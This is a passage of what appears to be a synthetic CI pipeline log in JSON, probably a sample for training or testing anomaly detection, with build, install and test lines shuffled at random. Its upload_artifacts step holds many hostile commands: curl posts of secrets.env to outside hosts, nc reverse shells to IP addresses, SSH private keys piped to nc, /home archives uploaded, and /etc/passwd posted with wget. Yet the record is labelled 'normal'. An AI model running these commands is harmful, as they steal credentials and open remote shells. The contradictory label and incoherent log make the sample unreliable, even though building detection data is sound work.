          "Cache hit for key-1596",
          "Cache hit for key-2539",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Cache hit for key-6655",
          "Step 8/10: Building",
          "Installing prettier@5.10.0",
          "  PASS: test_cache_hit (497ms)",
          "Installing jest@5.19.0",
          "  PASS: test_cache_hit (335ms)",
          "  PASS: test_auth_login (456ms)",
          "Installing jest@5.19.0",
          "Step 8/10: Building",
          "Cache hit for key-9763",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5594",
          "Step 5/10: Building",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing prettier@5.20.0",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Cache hit for key-4134",
          "  PASS: test_db_connect (351ms)",
          "  PASS: test_cache_hit (265ms)",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Compiling src/handler.rs...",
          "Installing webpack@2.16.0",
          "Step 1/10: Building",
          "  PASS: test_user_create (431ms)",
          "[12:00:19] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing axios@4.16.0",
          "Installing jest@5.9.0",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing webpack@1.2.0",
          "Cache hit for key-1405",
          "Cache hit for key-2617",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (433ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-14T12:01:19.391528",
        "finished_at": "2025-12-14T12:01:23.563235",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Compiling src/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 10/10: Building",
          "Step 3/10: Building",
          "  PASS: test_db_connect (462ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-9511",
          "Step 2/10: Building",
          "[12:00:19] INFO: Processing request",
          "Installing webpack@2.12.0",
          "  PASS: test_api_health (482ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 build completed",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (202ms)",
          "Step 5/10: Building",
          "Installing lodash@3.9.0",
          "Installing express@5.20.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (348ms)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Installing prettier@1.9.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing webpack@5.7.0",
          "Installing eslint@5.0.0",
          "  PASS: test_cache_hit (393ms)",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_db_connect (160ms)",
          "  PASS: test_user_create (118ms)",
          "Installing prettier@4.14.0",
          "Installing eslint@1.13.0",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing lodash@3.10.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-1932",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (89ms)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_user_create (315ms)",
          "Cache hit for key-2998",
          "  PASS: test_db_connect (306ms)",
          "[12:00:19] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_auth_login (419ms)",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (96ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Installing axios@1.0.0",
          "Step 1/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-4420",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-9452",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-14T12:01:23.563235",
        "finished_at": "2025-12-14T12:01:26.344373",
        "log_lines": [
          "=== Step: deploy_production ===",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Exception: NullPointerException",
          "Compiling src/index.js...",
          "Cache hit for key-5264",
          "Step 4/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing prettier@2.6.0",
          "\u2713 lint completed",
          "Cache hit for key-3483",
          "Cache hit for key-6775",
          "Compiling src/service.java...",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_db_connect (254ms)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "  PASS: test_user_create (109ms)",
          "Installing eslint@2.9.0",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "Installing webpack@4.13.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:19] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "FAILED: test_db_connect",
          "  PASS: test_user_create (118ms)",
          "Cache hit for key-4696",
          "\u2713 build completed",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-5666",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Installing express@3.19.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Cache hit for key-7277",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing jest@3.19.0",
          "Installing jest@4.11.0",
          "[12:00:19] WARN: Deprecated API usage",
          "Step 6/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-6175",
          "\u2713 lint completed",
          "Cache hit for key-7563",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Cache hit for key-7473",
          "Cache hit for key-6739",
          "[12:00:19] INFO: Processing request",
          "Installing webpack@4.20.0",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Installing lodash@3.5.0",
          "Cache hit for key-3288",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-2772",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing axios@4.0.0",
          "  PASS: test_auth_login (433ms)",
          "  PASS: test_auth_login (105ms)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-14T12:01:26.344373",
        "finished_at": "2025-12-14T12:01:29.125511",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing react@1.8.0",
          "  PASS: test_cache_hit (156ms)",
          "Installing axios@4.12.0",
          "Cache hit for key-4107",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-5522",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 7/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-3882",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Cache hit for key-9636",
          "  PASS: test_cache_hit (148ms)",
          "Compiling src/handler.rs...",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (44ms)",
          "Cache hit for key-6361",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Installing express@3.9.0",
          "Cache hit for key-4446",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (437ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_db_connect (88ms)",
          "Installing react@2.6.0",
          "  PASS: test_api_health (186ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:19] INFO: Processing request",
          "Installing jest@1.17.0",
          "Cache hit for key-4090",
          "Installing webpack@1.17.0",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Step 2/10: Building",
          "  PASS: test_db_connect (396ms)",
          "Cache hit for key-1810",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing react@5.16.0",
          "Cache hit for key-6391",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5481",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Cache hit for key-1555",
          "Step 6/10: Building",
          "Cache hit for key-1019",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 4/10: Building",
          "  PASS: test_auth_login (482ms)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Installing eslint@3.20.0",
          "Installing webpack@5.14.0",
          "\u2713 test completed",
          "Installing lodash@3.19.0",
          "Installing lodash@1.16.0",
          "\u2713 build completed",
          "Installing express@4.14.0",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "Installing prettier@1.8.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing eslint@2.12.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-14T12:01:29.125511",
        "finished_at": "2025-12-14T12:01:43.031202",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:19] INFO: Processing request",
          "Step 5/10: Building",
          "Installing express@2.7.0",
          "\u2713 test completed",
          "Installing prettier@3.4.0",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "  PASS: test_api_health (244ms)",
          "  PASS: test_cache_hit (310ms)",
          "\u2717 build failed with exit code 108",
          "Compiling src/main.py...",
          "  PASS: test_api_health (264ms)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5429",
          "[12:00:19] INFO: Processing request",
          "Step 6/10: Building",
          "WARNING: express has known vulnerabilities",
          "Step 1/10: Building",
          "Cache hit for key-1593",
          "  PASS: test_api_health (222ms)",
          "Installing prettier@2.16.0",
          "  PASS: test_api_health (374ms)",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2000",
          "Installing express@1.9.0",
          "[12:00:19] INFO: Processing request",
          "Installing axios@5.2.0",
          "Installing axios@5.20.0",
          "  PASS: test_api_health (38ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing express@5.1.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 2/10: Building",
          "  PASS: test_db_connect (472ms)",
          "Step 6/10: Building",
          "[12:00:19] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_user_create (365ms)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (187ms)",
          "Step 3/10: Building",
          "  PASS: test_api_health (25ms)",
          "Cache hit for key-8473",
          "\u2713 build completed",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_api_health (473ms)",
          "Cache hit for key-3733",
          "[12:00:19] INFO: Processing request",
          "Installing prettier@4.13.0",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing eslint@5.12.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (10ms)",
          "Step 6/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-7902",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Cache hit for key-4036",
          "Installing prettier@5.14.0",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-1559",
          "  PASS: test_user_create (211ms)",
          "Installing axios@3.16.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-1126",
          "\u2717 build failed with exit code 102",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing eslint@1.16.0",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-14T12:01:43.031202",
        "finished_at": "2025-12-14T12:01:49.984048",
        "log_lines": [
          "=== Step: setup_node ===",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (483ms)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_db_connect (105ms)",
          "Step 8/10: Building",
          "Installing webpack@4.9.0",
          "  PASS: test_cache_hit (417ms)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2523",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_db_connect (143ms)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (108ms)",
          "\u2713 build completed",
          "Cache hit for key-9312",
          "Installing eslint@3.17.0",
          "Compiling src/app.ts...",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "[12:00:19] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-8088",
          "\u2717 build failed with exit code 52",
          "Installing react@3.11.0",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing jest@5.13.0",
          "  PASS: test_cache_hit (143ms)",
          "  PASS: test_api_health (29ms)",
          "Step 7/10: Building",
          "  PASS: test_user_create (474ms)",
          "Step 5/10: Building",
          "Cache hit for key-2854",
          "Installing eslint@3.10.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-8603",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Cache hit for key-5827",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_auth_login (8ms)",
          "Installing webpack@4.7.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_auth_login (342ms)",
          "Installing jest@2.14.0",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_db_connect (298ms)",
          "Installing express@4.16.0",
          "  PASS: test_user_create (100ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_auth_login (206ms)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Installing eslint@2.19.0",
          "Installing prettier@2.5.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-14T12:01:49.984048",
        "finished_at": "2025-12-14T12:01:56.936894",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "\u2713 build completed",
          "Sending 386MB of data to startup.dev",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "nc -e /bin/sh 184.68.21.23 41513",
          "WARNING: eslint has known vulnerabilities",
          "Installing jest@2.20.0",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 18.40.60.225 61062",
          "WARNING: react has known vulnerabilities",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 163.98.175.169 6973",
          "Installing express@3.15.0",
          "Cache hit for key-5916",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Installing react@5.18.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-5762",
          "\u2713 test completed",
          "Cache hit for key-3796",
          "  PASS: test_db_connect (470ms)",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing react@2.10.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "[12:00:19] WARN: Deprecated API usage",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 76.22.226.22 56445",
          "Installing react@3.2.0",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (273ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "Sending 381MB of data to cloud.services",
          "Sending 276MB of data to cloud.services",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-7561",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_api_health (47ms)",
          "Step 9/10: Building",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Compiling src/utils.go...",
          "[12:00:19] INFO: Processing request",
          "Compiling src/app.ts...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "  PASS: test_auth_login (77ms)",
          "Sending 11MB of data to acme.corp",
          "Cache hit for key-7873",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 222.74.86.224 21876",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:00:19] INFO: Processing request",
          "Sending 91MB of data to startup.dev",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-1660",
          "Step 1/10: Building",
          "Sending 149MB of data to cloud.services",
          "Installing lodash@1.7.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_db_connect (16ms)",
          "Step 9/10: Building",
          "Cache hit for key-9733",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing prettier@3.15.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Compiling src/app.ts...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 13.64.177.24 53402",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "nc -e /bin/sh 103.158.119.46 20299",
          "Artifact uploaded: build.tar.gz (12MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 192.31.214.188 61048",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Installing axios@4.19.0",
          "Cache hit for key-3362",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 1",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Step 1/10: Building",
          "Installing react@5.3.0",
          "Installing axios@3.16.0",
          "Installing jest@1.5.0",
          "Cache hit for key-7683",
          "Compiling src/main.py...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (252ms)",
          "Compiling src/index.js...",
          "Exception: ValueError",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing eslint@5.12.0",
          "\u2713 test completed",
          "[12:00:19] ERROR: Connection failed",
          "Cache hit for key-3605",
          "Cache hit for key-5010",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing lodash@1.3.0",
          "[12:00:19] INFO: Processing request",
          "Installing eslint@4.0.0",
          "  PASS: test_user_create (359ms)",
          "  PASS: test_cache_hit (261ms)",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}